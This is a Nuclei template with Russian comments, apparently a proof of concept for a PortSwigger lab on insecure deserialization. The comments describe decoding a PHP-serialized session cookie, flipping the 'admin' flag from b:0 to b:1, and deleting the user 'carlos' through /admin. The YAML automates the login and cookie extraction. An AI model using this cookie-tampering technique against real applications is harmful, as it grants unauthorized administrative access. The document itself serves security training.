@@ -1,0 +1,65 @@
+# POC
+# Решение
+# Зайти как wiener
+# Декодировать куку >>> O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}7
+# Заменить значение b:0 на b:1 >>> O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}7
+# Обратно закодировать и заменить куку на новую и обновить страницу
+# Перейти на страницу /admin и удалить карлоса
+
+id: POC_lab-deserialization-modifying-serialized-objects
+
+info:
+  name: POC_lab-deserialization-modifying-serialized-objects
+  author: FIR_UIII
+  severity: info
+  description: Modifying serialized objects
+  reference: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
+  tags: deserialization,portswigger
+
+
+flow: http(1) && http(2) # строим флоу запросов сначана GET затем POST
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+
+    matchers-condition: and # двойное условие
+    matchers:
+      - type: status
+        status:
+          - 401
+      - type: word
+        part: body # ищем по ключевому слову
+        words:
+          - 'Admin interface only available if logged in as an administrator'
+
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=wiener&password=peter
+
+    redirects: true
+    cookie-reuse: true
+    
+    extractors:
+    - type: regex
+      name: cookie_encoded # выводит в консоль значени куки - нужно декодировать из base64
+      part: header
+      group: 1 # берет только указанную regex группу от 0 до n т.е значение внутри ()
+      regex:
+        - 'session=(.{79})'
+
+    matchers-condition: and
+    matchers:
+    - type: dsl
+      dsl:
+        - len(cookie_encoded) >= 79 # сравниват ожидаемую длину
+        - cookie_encoded == 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30'
+      condition: or
+
+
